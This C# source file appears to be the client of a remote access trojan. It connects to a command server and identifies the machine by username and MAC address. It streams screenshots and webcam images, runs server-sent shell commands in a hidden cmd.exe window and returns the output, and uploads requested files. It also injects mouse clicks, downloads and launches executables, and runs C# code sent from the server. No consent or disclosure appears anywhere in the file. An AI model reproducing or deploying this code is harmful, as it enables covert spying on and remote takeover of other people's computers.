using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Diagnostics;
using System.Windows.Forms;
using System.Management;
using System.Runtime.InteropServices;
using System.IO;
using NetServer.TcpServer.Protocols;

namespace NetServer.TcpServer {
	public class Client {

		#region Fields
		private static readonly int _version = 1;

		private static string _serverIP = string.Empty;
		private static readonly int _port = 8117;
		private static readonly int _headSize = DataHead.Size;
		private static readonly object _syncRelease = new object();

		private bool _connected = false;
		private bool _sendScreen = false;
		private bool _sendCamera = false;
		private long _sendScreenInterval = 300;
		private long _sendCameraInterval = 0;
		private long _lastSendScreenTime = 0;
		private long _lastSendCameraTime = 0;
		private long _cameraStartTime = -1;

		private Queue<DataHead> _requestQueue = new Queue<DataHead>();
		private Queue<byte[]> _responseQueue = new Queue<byte[]>();
		private Queue<byte> _byteQueue = new Queue<byte>();

		private TcpClient _tcpClient = null;
		private Thread _responseThread = null;
		private Thread _requestThread = null;
		private Thread _FileTransportThread = null;


		#endregion

		#region Property
		public bool IsConnected {
			get {
				return _connected;
			}
		}

		public string ServerIp {
			get {
				return _serverIP;
			}
			set {
				_serverIP = value;
			}
		}
		#endregion

		#region ReleaseConnect
		/// <summary>
		/// 释放所有资源，尝试重新连接
		/// </summary>
		public void ReleaseConnect() {
			lock (_syncRelease) {
				if (_responseThread != null) {
					try {
						_responseThread.Abort();
					}
					finally {
						_responseThread = null;
					}
				}

				if (_requestThread != null) {
					try {
						_requestThread.Abort();
					}
					finally {
						_requestThread = null;
					}
				}

				try {
					if (_tcpClient != null)
						_tcpClient.Close();
				}
				finally {
					_tcpClient = null;
				}

				_connected = false;
			}
		}
		#endregion

		#region StartReleaseThread
		/// <summary>
		/// 启动资源释放线程
		/// </summary>
		private void StartReleaseThread() {
			Thread releaseThread = new Thread(new ThreadStart(ReleaseConnect));
			releaseThread.Start();
		}
		#endregion

		#region API
		[DllImport("user32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
		public static extern void mouse_event(uint dwFlags, uint dx, uint dy, uint cButtons, uint dwExtraInfo);

		const int MOUSEEVENTF_MOVE = 0x0001;
		const int MOUSEEVENTF_LEFTDOWN = 0x0002;
		const int MOUSEEVENTF_LEFTUP = 0x0004;
		const int MOUSEEVENTF_RIGHTDOWN = 0x0008;
		const int MOUSEEVENTF_RIGHTUP = 0x0010;
		const int MOUSEEVENTF_MIDDLEDOWN = 0x0020;
		const int MOUSEEVENTF_MIDDLEUP = 0x0040;
		const int MOUSEEVENTF_ABSOLUTE = 0x8000;
		#endregion

		#region ReceiveHandle
		/// <summary>
		/// Receive处理线程
		/// 从Stream里Receive数据并处理
		/// </summary>
		private void ReceiveHandle() {
			while (true) {
				try {
					ReceiveByte();
				}
				catch {
					ReleaseConnect();
				}
				Application.DoEvents();
				Thread.Sleep(200);

			}
		}
		#endregion

		#region SendHandle
		/// <summary>
		/// 发送线程
		/// </summary>
		private void SendHandle() {
			while (true) {
				try {
					lock (_responseQueue) {
						SendQueue();
					}
				}
				catch {
					ReleaseConnect();
				}
				Application.DoEvents();
				Thread.Sleep(200);
			}
		}
		#endregion

		#region ConnectToServer
		public void ConnectToServer() {

			//string hostIP = "127.0.0.1";
			//_serverIP = "127.0.0.1";

			//string hostIP = "180.95.146.203";

			IPAddress ipa = IPAddress.Parse(_serverIP);
			IPEndPoint ipe = new IPEndPoint(ipa, _port);


			_tcpClient = new TcpClient();


			try {
				_tcpClient.Connect(ipe);
				if (_tcpClient.Connected) {

					string screenInfo = Screen.PrimaryScreen.Bounds.Width.ToString() + "x" + Screen.PrimaryScreen.Bounds.Height.ToString();
					//new CameraProtocol();

					string hasCamera = "hasCamera:";
					if (CameraProtocol.HasDevice) {
						hasCamera += "1";
					}
					else {
						hasCamera += "0";
					}

					NetworkStream networkStream = _tcpClient.GetStream();
					string loginInfo = _version + ";" +  GetId() + ";" + screenInfo + ";" + hasCamera;
					DataHead LoginHead = new DataHead(0, Protocols.ProtocolType.C2SMessage, loginInfo);
					networkStream.Write(LoginHead.GetHeadByte(), 0, DataHead.Size);

					_connected = true;
					_lastSendScreenTime = UnixTimeNow();
					_lastSendCameraTime = UnixTimeNow();
					//new CameraProtocol();

					_requestThread = new Thread(new ThreadStart(ReceiveHandle));
					_responseThread = new Thread(new ThreadStart(SendHandle));

					FileTransport.ServerIP = _serverIP;
					_FileTransportThread = new Thread(new ThreadStart(FileTransport.SendFile));

					_responseThread.Start();
					_requestThread.Start();
					_FileTransportThread.Start();

				}
				else {
					throw new Exception("Connect Fail");
				}

			}
			catch {
				ReleaseConnect();
			}
		}
		#endregion

		#region SendQueue
		/// <summary>
		/// 发送服务端请求队列
		/// </summary>
		private void SendQueue() {
			//_lastSendScreenTime = UnixTimeNow();
			try {
				if (_tcpClient != null) {
					NetworkStream networkStream = _tcpClient.GetStream();
					while (_responseQueue.Count > 0) {
						byte[] data = _responseQueue.Dequeue();
						if (networkStream.CanWrite) networkStream.Write(data, 0, data.Length);
						//Application.DoEvents();
					}

					long unixTimeNow = UnixTimeNow();

					if (_cameraStartTime != -1 && unixTimeNow - _cameraStartTime >= 600000) {
						CameraProtocol.SetCamerOnState(false); ;
						_cameraStartTime = -1;
					}

					if (CameraProtocol.HasDevice && _sendCamera && (unixTimeNow - _lastSendCameraTime > _sendCameraInterval)) {
						SendCamera(networkStream);
					}


					if (_sendScreen && (unixTimeNow - _lastSendScreenTime > _sendScreenInterval)) {
						SendScreen(networkStream);
					}
				}
			}
			catch {
				StartReleaseThread();
			}
			Application.DoEvents();

		}

		private void SendScreen(NetworkStream networkStream) {
			if (networkStream != null) {
				ScreenProtocol screenProtocol = new ScreenProtocol(true);
				if (screenProtocol.Data != null) {
					byte[] data = SendPackageByte(Protocols.ProtocolType.C2SScreenShot, screenProtocol);
					if (networkStream.CanWrite) networkStream.Write(data, 0, data.Length);
					_lastSendScreenTime = UnixTimeNow();
				}
			}
		}

		private void SendCamera(NetworkStream networkStream) {
			if (networkStream != null) {
				CameraProtocol cameraProtocol = new CameraProtocol();
				cameraProtocol.Data = CameraProtocol.GetCameraByte();
				if (cameraProtocol.Data != null) {
					byte[] data = SendPackageByte(Protocols.ProtocolType.C2SCamera, cameraProtocol);
					if (networkStream.CanWrite) networkStream.Write(data, 0, data.Length);
					_lastSendCameraTime = UnixTimeNow();
				}
			}

		}
		#endregion

		#region RunRequestAndAddToHandleQueue
		/// <summary>
		/// 接受请求并把结果发回放入发送队列
		/// </summary>
		private void RunRequestAndAddToHandleQueue() {
			while (_byteQueue.Count >= _headSize) {
				byte[] headByte = new byte[_headSize];
				for (int i = 0; i < _headSize; i++) {
					headByte[i] = _byteQueue.Dequeue();
				}
				DataHead head = new DataHead(headByte);
				byte[] data = null;
				lock (_responseQueue) {
					switch (head.HeadType) {
						case Protocols.ProtocolType.S2CGetDevices:
							DeviceProtocol deviceProtocol = new DeviceProtocol();
							data = SendPackageByte(Protocols.ProtocolType.C2SDeviceList, deviceProtocol);
							_responseQueue.Enqueue(data);
							break;

						case Protocols.ProtocolType.S2CGetFileList:
							FileListProtocol fileProtocol = new FileListProtocol(head.Tag);
							data = SendPackageByte(Protocols.ProtocolType.C2SFileList, fileProtocol);
							_responseQueue.Enqueue(data);
							break;

						case Protocols.ProtocolType.S2CSetScreenShotState:
							if (head.Tag == "1") _sendScreen = true;
							else _sendScreen = false;
							break;

						case Protocols.ProtocolType.S2CSetCameraState:
							if (CameraProtocol.HasDevice) {
								if (head.Tag == "1") {
									CameraProtocol.SetCamerOnState(true);
									_cameraStartTime = UnixTimeNow();
									_sendCamera = true;
								}
								else {
									CameraProtocol.SetCamerOnState(false);
									_cameraStartTime = -1;
									_sendCamera = false;
								}
							}
							break;

						case Protocols.ProtocolType.S2CSetScreenInterval:
							try {
								_sendScreenInterval = Convert.ToInt32(head.Tag);
							}
							catch {
							}
							break;

						case Protocols.ProtocolType.S2CSetCameraInterval:
							try {
								_sendCameraInterval = Convert.ToInt32(head.Tag);
							}
							catch {
							}
							break;

						case Protocols.ProtocolType.S2CGetCommandResult:
							CommandProtocol commandProtocol = new CommandProtocol(RunCommand(head.Tag));
							data = SendPackageByte(Protocols.ProtocolType.C2SCommandResult, commandProtocol);
							_responseQueue.Enqueue(data);
							break;

						case Protocols.ProtocolType.S2CEventMouseClick:
							string[] mouseEvent = head.Tag.Split(':');
							uint buttonClick = Convert.ToUInt32(mouseEvent[0]);
							float x = (float)Screen.PrimaryScreen.Bounds.Width * Convert.ToSingle(mouseEvent[1]);
							float y = (float)Screen.PrimaryScreen.Bounds.Height * Convert.ToSingle(mouseEvent[2]);

							mouse_event(buttonClick, (uint)x, (uint)y, 0, 0);
							//mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, (uint)x, (uint)y, 0, 0);

							break;

						case Protocols.ProtocolType.S2CFileDownload:
							string filePath = head.Tag;
							FileTransport.AddFile(filePath);
							break;

						case Protocols.ProtocolType.S2CUpdate:
							string[] files = head.Tag.Split('|');
							string path = Environment.CurrentDirectory.EndsWith("\\") ? Environment.CurrentDirectory : Environment.CurrentDirectory + "\\";
							try {
								DownloadFile(files[0], @"./updateMe.exe");
							}
							catch {
							}
							if (files[1] != null && files[1] != "") {
								try {
									DownloadFile(files[1], @"./newVersion.exe");
								}
								catch {
								}
							}
							Process.Start(@"./upme.exe");
							break;

						case Protocols.ProtocolType.S2CDownload:
							string[] downloadFiles = head.Tag.Split('|');
							try {
								DownloadFile(downloadFiles[0], downloadFiles[1]);
							}
							catch (Exception ex) {
								MessageBox.Show(ex.ToString());
							}
							break;

						case Protocols.ProtocolType.S2CRunCSharpCode:
							RunCSharpCode.RunCode(head.Tag);
							break;
					}
				}
			}

		}
		#endregion

		#region ReceiveByte
		/// <summary>
		/// 从Stream获取byte并存入队列等待处理
		/// </summary>
		/// <param name="stream">当前可用NetworkStream</param>
		/// <param name="buffSize">单次读取的Buff长度</param>
		private void ReceiveByte() {
			try {
				NetworkStream stream = _tcpClient.GetStream();
				int buffSize = _tcpClient.ReceiveBufferSize;

				byte[] myReadBuffer = null;
				if (stream.CanRead) {
					myReadBuffer = new byte[buffSize];
					int numberOfBytesRead = 0;
					do {
						numberOfBytesRead = stream.Read(myReadBuffer, 0, buffSize);
						if (numberOfBytesRead != 0) {
							for (int i = 0; i < numberOfBytesRead; i++) {
								_byteQueue.Enqueue(myReadBuffer[i]);
							}
							RunRequestAndAddToHandleQueue();
						}
					}
					while (stream.DataAvailable);
				}
			}
			catch {
				StartReleaseThread();
			}
		}
		#endregion

		#region SendPackageByte
		/// <summary>
		/// 获取将要发送的Protocol的Byte数组
		/// </summary>
		/// <param name="type">Protocl的类型，用于生成DataHead</param>
		/// <param name="protocol">Protocol Data</param>
		/// <param name="tag">DataHead Tag</param>
		/// <returns>需要发送的Byte数组</returns>
		private byte[] SendPackageByte(NetServer.TcpServer.Protocols.ProtocolType type, Protocol protocol, string tag = "") {
			DataHead head = new DataHead(protocol.Data.Length, type, tag);
			byte[] SendData = new byte[DataHead.Size + protocol.Data.Length];
			byte[] headData = head.GetHeadByte();

			int index = 0;

			foreach (byte data in headData) {
				SendData[index] = data;
				index++;
			}

			foreach (byte data in protocol.Data) {
				SendData[index] = data;
				index++;
			}

			return SendData;
		}
		#endregion


		#region Help Function
		public long UnixTimeNow() {
			TimeSpan ts = DateTime.UtcNow - new DateTime(1970, 1, 1, 0, 0, 0, 0);
			return Convert.ToInt64(ts.TotalMilliseconds);
		}

		private string RunCommand(string command) {

			Process process = new Process();

			process.StartInfo.FileName = "cmd.exe";

			process.StartInfo.UseShellExecute = false;
			process.StartInfo.RedirectStandardInput = true;
			process.StartInfo.RedirectStandardOutput = true;
			process.StartInfo.RedirectStandardError = true;
			process.StartInfo.CreateNoWindow = true;

			process.Start();

			process.StandardInput.WriteLine(command);
			process.StandardInput.WriteLine("exit");
			string strRst = process.StandardOutput.ReadToEnd();
			return strRst;
		}

		/// <summary>
		/// 获取本机id
		/// </summary>
		/// <returns></returns>
		private string GetId() {
			string name = Environment.UserName;
			string mac = string.Empty;
			ManagementClass mc = new ManagementClass("Win32_NetworkAdapterConfiguration");
			ManagementObjectCollection moc = mc.GetInstances();
			foreach (ManagementObject mo in moc) {
				if ((bool)mo["IPEnabled"] == true) {
					mac = mo["MacAddress"].ToString().Replace(":", "");
					break;
				}
			}
			moc = null;
			mc = null;
			name += ("_" + mac);
			return name;
		}

		private void DownloadFile(string url, string fileName) {
			using (WebClient myWebClient = new WebClient()) {
				myWebClient.DownloadFile(url, fileName);
			}
		}

		public static string GetPage(string url, Encoding encoding) {
			HttpWebRequest request = null;
			HttpWebResponse response = null;
			StreamReader reader = null;
			try {
				request = (HttpWebRequest)WebRequest.Create(url);
				//request.UserAgent = "User-Agent:Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705";
				request.Timeout = 20000;
				request.AllowAutoRedirect = false;
				response = (HttpWebResponse)request.GetResponse();
				if (response.StatusCode == HttpStatusCode.OK && response.ContentLength < 1024 * 1024) {
					reader = new StreamReader(response.GetResponseStream(), encoding);
					string html = reader.ReadToEnd();
					return html;
				}
			}
			catch { }
			finally {
				if (response != null) {
					response.Close();
					response = null;
				}
				if (reader != null)
					reader.Close();
				if (request != null)
					request = null;
			}
			return string.Empty;
		}
	}
		#endregion
}
